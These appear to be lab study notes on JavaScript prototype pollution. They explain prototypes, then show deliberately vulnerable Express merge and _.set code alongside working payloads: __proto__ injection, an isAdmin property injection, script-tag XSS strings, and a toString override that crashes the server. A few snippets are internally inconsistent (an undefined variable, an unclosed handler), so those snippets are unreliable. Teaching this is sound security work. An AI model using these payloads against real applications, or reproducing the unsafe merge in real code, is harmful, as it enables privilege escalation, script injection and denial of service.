# TASK 2 Essential Recap

## Classes

Classes in JavaScript are blueprints for creating objects with shared structures and behaviors

```javascript
// Class for User 
class UserProfile {
    constructor(name, age, followers, dob) {
        this.name = name;
        this.age = age;
        this.followers = followers;
        this.dob = dob; // Adding Date of Birth
    }
}

// Class for Content Creator Profile inheriting from User 
class ContentCreatorProfile extends UserProfile {
    constructor(name, age, followers, dob, content, posts) {
        super(name, age, followers, dob);
        this.content = content;
        this.posts = posts;
    }
}

// Creating instances of the classes
let regularUser = new UserProfile('Ben S', 25, 1000, '1/1/1990');
let contentCreator = new ContentCreatorProfile('Jane Smith', 30, 5000, '1/1/1990', 'Engaging Content', 50);
```

## Prototype

In JavaScript, every object links to a prototype, forming a prototype chain. 
The prototype acts as a blueprint, enabling objects to inherit properties and methods. 
Here's how it works in our social network example:

```javascript
// Prototype for User 
let userPrototype = {
  greet: function() {
    return `Hello, ${this.name}!`;
  }
};

// User Constructor Function
function UserProfilePrototype(name, age, followers, dob) {
  let user = Object.create(userPrototype);
  user.name = name;
  user.age = age;
  user.followers = followers;
  user.dob = dob;
  return user;
}

// Creating an instance
let regularUser = UserProfilePrototype('Ben S', 25, 1000, '1/1/1990');

// Using the prototype method
console.log(regularUser.greet());
```
        
## Difference between Class and Prototype

Classes in JavaScript provide a structured way to create objects with shared properties and methods, like blueprints for consistent models. 
Prototypes, however, allow objects to inherit behaviors dynamically by linking to a prototype object. 
While classes offer clarity and uniformity, prototypes provide flexibility but can be harder to manage.

## Inheritance

In JavaScript, inheritance allows one object to inherit properties from another, creating a hierarchy of related objects. Continuing with our social network example, let's consider a more specific profile for a content creator. This new object can inherit properties from the general user profile, like name and followers, and add particular properties, such as content and posts.

```javascript
let user = {
  name: 'Ben S',
  age: 25,
  followers: 1000,
  DoB: '1/1/1990'
};

// Content Creator Profile inheriting from User 
let contentCreatorProfile = Object.create(user);
contentCreatorProfile.content = 'Engaging Content';
contentCreatorProfile.posts = 50;
```

Here, contentCreatorProfile inherits properties from user using Object.create(). 
It adds specific properties like content and posts while inheriting name, age, and followers from user.

Inheritance allows creating specialized objects while reusing common properties. JavaScript supports:

1. Prototype-based Inheritance: Objects inherit from a prototype. Use Object.create() to set a prototype or modify an existing object's prototype.
2. Class-based Inheritance: Classes provide a familiar syntax for inheritance but are syntactic sugar over prototypes.

Example:
- UserProfile defines shared properties like email and password.
- ContentCreatorProfile inherits from UserProfile and adds posts.
- JavaScript checks the object first for properties, then its prototype chain.

Prototypes enable inheritance, allowing objects to share properties and methods efficiently. 
Subclasses like ContentCreator or Moderator can extend UserProfile for code reuse and maintainability.

__________________________________________________________________________________________


# TASK 3 How it Works

Prototype pollution is a vulnerability where an attacker manipulates an object's prototype, affecting all instances of that object. 
In JavaScript, prototypes enable inheritance, but attackers can exploit this to modify shared properties or inject malicious behavior.
While prototype pollution alone may not always be directly exploitable, it becomes dangerous when combined with other vulnerabilities like XSS or CSRF.

Example: An attacker alters the `introduce` method in a `Person` prototype, impacting all instances.

```javascript
// Base Prototype for Persons
let personPrototype = {
  introduce: function() {
    return `Hi, I'm ${this.name}.`;
  }
};

// Person Constructor Function
function Person(name) {
  let person = Object.create(personPrototype);
  person.name = name;
  return person;
}

// Creating an instance
let ben = Person('Ben');
```

An attacker can inject malicious content into the introduce method for all instances using the __proto__ property. 
The __proto__ property allows access to an object's prototype, enabling inheritance manipulation. 
For example, an attacker could execute the following code via an attack vector like XSS or CSRF:

```javascript
// Attacker's Payload
ben.__proto__.introduce = function() {
  console.log("You've been hacked, I'm Bob");
};
console.log(ben.introduce());
```

We will summarize what happens:

- **Prototype Definition**: The Person prototype (personPrototype) has an introduce method.
- **Object Instantiation**: An instance 'Ben' is created (let ben = Person('Ben');).
- **Prototype Pollution Attack**: The attacker modifies the prototype's introduce method via __proto__.
- **Impact on Instances**: The change affects all instances, including 'Ben', altering their behavior.

This shows how prototype pollution can change shared methods, causing security risks. 
Prevent it by validating input and avoiding prototype modifications with untrusted data.

__________________________________________________________________________________________


# TASK 4 Exploitation - XSS

## Standard Approach

JavaScript's Object prototype includes properties like constructor and __proto__, which attackers exploit to manipulate prototype chains, leading to prototype pollution.

## Golden Rule

Attackers can modify shared properties by controlling parameters like x and val in expressions like Person[x][y] = val. 
More complex attacks involve deeper property structures.

## Few Important Functions

Functions that set object properties based on paths (e.g., object[a][b][c] = value) are risky if paths are user-controlled. 
Example: adding reviews to a friend's profile.

### Initial Object Structure

The friends array contains profile objects with properties like id, name, reviews, etc.

```javascript
let friends = [ { id: 1, name: "testuser", age: 25, country: "UK", reviews: [], albums: [{ }], password: "xxx", } ]; 
_.set(friend, input.path, input.value);
```

### Input Received from User

A user provides a payload to add a review. An attacker modifies the path to target the prototype.
                
```javascript
{ "path": "reviews[0].content", "value": "&#60;script&#62;alert('anycontent')&#60;/script&#62;" };
```

### Resulting Object Structure

The review is added without sanitization, allowing XSS.

```javascript
let friends = [
  {
    id: 1,
    name: "testuser",
    age: 25,
    country: "UK",
    reviews: [
      "<script>alert('anycontent')</script>"
    ],
    albums: [{}],
    password: "xxx",
  }
];
```

Attackers can insert properties like isAdmin using a payload.

```javascript
const payload = { "path": "isAdmin", "value": true };
```

The object is modified to include the malicious property.

```javascript
let friends = [
  {
    id: 1,
    name: "testuser",
    age: 25,
    country: "UK",
    reviews: [],
    albums: [],
    password: "xxx",
    isAdmin: true // Malicious property inserted by the attacker
  }
];
```

## Practical Example

A pentester tests a social media app. 
The submit review feature allows adding reviews to a friend's profile.
            
```html
<form action="/submit-friend-review" method="post" class="mb-4">
    <h2 class="mb-3">Submit a Review</h2>
    <input type="hidden" name="friendId" value="1">
    <div class="form-group">
        <textarea class="form-control" name="reviewContent" placeholder="Write your review here"
            rows="3"></textarea>
    </div>
    <button type="submit" class="btn btn-primary">Submit Review</button>
</form>
```

### Server-Side Code
The server validates the session, verifies the friendId, and uses _.set to add the review.
            
```javascript
let friends = [
  {
    id: 1,
    name: "Sabalenka",
    age: 25,
    country: "UK",
    reviews: [],
    albums: [{ name: "USA Trip", photos: "git.thm" }],
    password: "xxx",
  },
...
...
app.post("/submit-friend-review", (req, res) => {
  if (!req.session.user) {
    return res.redirect("/signin");
  }
  const { friendId, reviewContent } = req.body;
  const friend = friends.find((f) => f.id === parseInt(friendId));
  if (!friend) {
    return res.status(404).send("Friend not found");
  }
  try {
    const input = JSON.parse(reviewContent);
    _.set(friend, input.path, payload.value);
  } catch (e) { }
  res.redirect(`/friend/${friendId}`);
});
```

### Exploitation
An attacker sends a payload to trigger XSS when visiting the profile.
            
```javascript
{"path": "reviews[0].content", "value": "<script>alert('Hacked')</script>"}
```

__________________________________________________________________________________________


# TASK 5 Exploitation - Property Injection

## Few Important Functions

### Object Recursive Merge: This function recursively merges properties from source objects into a target object. Without input validation, attackers can exploit it to modify the prototype chain. For example, merging user settings:

```javascript
// Vulnerable recursive merge function
function recursiveMerge(target, source) {
    for (let key in source) {
        if (source[key] instanceof Object) {
            if (!target[key]) target[key] = {};
            recursiveMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Endpoint to update user settings
app.post('/updateSettings', (req, res) => {
    const userSettings = req.body; // User-controlled input
    recursiveMerge(globalUserSettings, userSettings);
    res.send('Settings updated!');
});
```

An attacker sends a request with a nested object containing __proto__:

```javascript
{ "__proto__": { "newProperty": "value" } }
```

### Object Clone:   
Object cloning is a similar functionality that allows deep clone operations to copy properties from the prototype chain to another one inadvertently. 
Testing should ensure that these functions only clone the user-defined properties of an object and filter special keywords like __proto__, constructor, etc. 
A possible use case is that the application backend clones objects to create new user profiles:

## Practical Example

Let's see how attackers exploit the vulnerability using the Clone Album feature, which allows users to duplicate an album with a new name.
Let's explore the client-side and server-side code to explore various exploitation possibilities.

```html
<form action="/clone-album/1" method="post" class="mb-4">
        <h2 class="mb-3">Clone Album of Josh</h2>
        <div class="form-group">
            <label for="selectedAlbum">Select an Album to Clone:</label>
            <select class="form-control" name="selectedAlbum" id="selectedAlbum">
                    <option value="Trip to US">
                        Trip to US
                    </option>
            </select>
        </div>
        <div class="form-group">
            <label for="newAlbumName">New Album Name:</label>
            <input type="text" class="form-control" name="newAlbumName" id="newAlbumName"
                placeholder="Enter new album name">
        </div>
        <button type="submit" class="btn btn-primary">Clone Album</button>
    </form>
```

The client-side code takes the name as input and calls the API endpoint /clone-album/{album_ID} to clone the album. 
Prototype pollution alone is rarely exploitable, but combined with XSS, it increases the attack surface. 
Here's the server-side code:

```javascript
app.post("/clone-album/:friendId", (req, res) => {
  const { friendId } = req.params;
  const { selectedAlbum, newAlbumName } = req.body;
  const friend = friends.find((f) => f.id === parseInt(friendId));
  if (!friend) return res.status(404).send("Friend not found");
  const albumToClone = friend.albums.find((album) => album.name === selectedAlbum);
  if (albumToClone && newAlbumName) {
    let clonedAlbum = { ...albumToClone };
    try {
      const payload = JSON.parse(newAlbumName);
      merge(clonedAlbum, payload);
    } catch (e) {}

function merge(to, from) {
  for (let key in from) {
    if (typeof to[key] == "object" && typeof from[key] == "object") {
      merge(to[key], from[key]);
    } else {
      to[key] = from[key];
    }
  }
  return to;
}
```

The server receives a JSON object with the album's name, clones the album, and updates the name using the merge function. 
The merge function is vulnerable to prototype pollution as it lacks sanitization. 
An attacker can exploit this by sending a request with __proto__ containing a newProperty and value, as shown below:

```javascript
{"__proto__": {"newProperty": "hacked"}}
```

The merge function treats __proto__ as a property, adding newProperty to the prototype instead of the object itself. 
This makes newProperty accessible to all objects sharing the same prototype.

- **Effect on All Objects**: Adding newProperty to the prototype affects all objects of the same type, as they share the same template.
- **Visibility**: newProperty is not directly visible in the object but can be accessed via friend.newProperty. 
  JavaScript checks the prototype chain if the property is not found on the object.
- **Rendering**: In EJS templates, for...in loops iterate over all enumerable properties, including those from the prototype, making newProperty visible on the screen.

__________________________________________________________________________________________


# TASK 6 Exploitation - Denial of Service

## Denial of Service

Prototype pollution can lead to Denial of Service (DoS) by altering widely used object prototypes, like `Object.prototype.toString`. 
This impacts all objects sharing the prototype, causing unexpected behavior or crashes. 
For instance, if `toString` is polluted with inefficient code or an infinite loop, it can exhaust system resources, leading to a DoS condition.

## Practical Example

Visit the URL http://10.82.159.188:5000 and test inputs to crash the server. 
Altering `Object.prototype.toString` can disrupt server-side processes, rendering the application unresponsive and denying service to users.

```html
<form action="/clone-album/1" method="post" class="mb-4">
        <h2 class="mb-3">Clone Album of Josh</h2>
        <div class="form-group">
            <label for="selectedAlbum">Select an Album to Clone:</label>
            <select class="form-control" name="selectedAlbum" id="selectedAlbum">
                    <option value="Trip to US">
                        Trip to US
                    </option>
            </select>
        </div>
        <div class="form-group">
            <label for="newAlbumName">New Album Name:</label>
            <input type="text" class="form-control" name="newAlbumName" id="newAlbumName"
                placeholder="Enter new album name">
        </div>
        <button type="submit" class="btn btn-primary">Clone Album</button>
    </form>
```

The merge function combines objects. Sending a payload to override a function like toString() can disrupt server behavior. 
Here's an example payload to override toString:

```javascript
{"__proto__": {"toString": "Just crash the server"}}
```

Go to the profile page and enter the payload as the new album name:

```
{"__proto__": {"toString": "Just crash the server"}}
```

When the app.js parses this JSON, it assigns the `toString` value to the `__proto__` property of the `friend` object. 
Since `toString` is widely used, this causes a TypeError: `Object.prototype.toString.call is not a function`. 
The application crashes when clicking "Clone Album." 
Other built-in functions like `toJSON` or `valueOf` can also be overridden, but the impact depends on their usage.


__________________________________________________________________________________________


# TASK 7 Automating the Process

## Major Issues During Identification

Prototype pollution is challenging to detect due to JavaScript's object-sharing. 
Automated tools help but require manual analysis, highlighting the need for skilled developers.

## Few Important Scripts

Several tools help detect prototype pollution:

- **NodeJsScan**: Scans Node.js apps for security issues, including prototype pollution.
- **Prototype Pollution Scanner**: Analyzes JavaScript code for pollution patterns.
- **PPFuzz**: Fuzzes input vectors to find pollution vulnerabilities.
- **Client-side detection by BlackFan**: Focuses on client-side pollution, showing XSS and other exploits.

__________________________________________________________________________________________


# TASK 8 Mitigation Measures

## Pentesters

- **Input Fuzzing**: Test user inputs with various payloads to detect prototype pollution.
- **Context Analysis**: Analyze code to find where user inputs interact with prototypes and test for vulnerabilities.
- **CSP Bypass**: Test if CSP headers can be bypassed to manipulate prototypes.
- **Dependency Analysis**: Check third-party libraries for vulnerabilities that allow prototype pollution.
- **Static Analysis**: Use tools to find prototype pollution risks during development.

## Secure Code Developers

- **Avoid __proto__**: Use Object.getPrototypeOf() instead of __proto__.
- **Immutable Objects**: Design objects to prevent unintended modifications.
- **Encapsulation**: Limit access to object prototypes by exposing only necessary interfaces.
- **Safe Defaults**: Initialize objects securely without relying on user inputs.
- **Input Sanitization**: Validate user inputs to prevent prototype manipulation.
- **Dependency Management**: Update libraries regularly and monitor for security patches.
- **Security Headers**: Use CSP to restrict loading of malicious scripts.

__________________________________________________________________________________________


# Appendix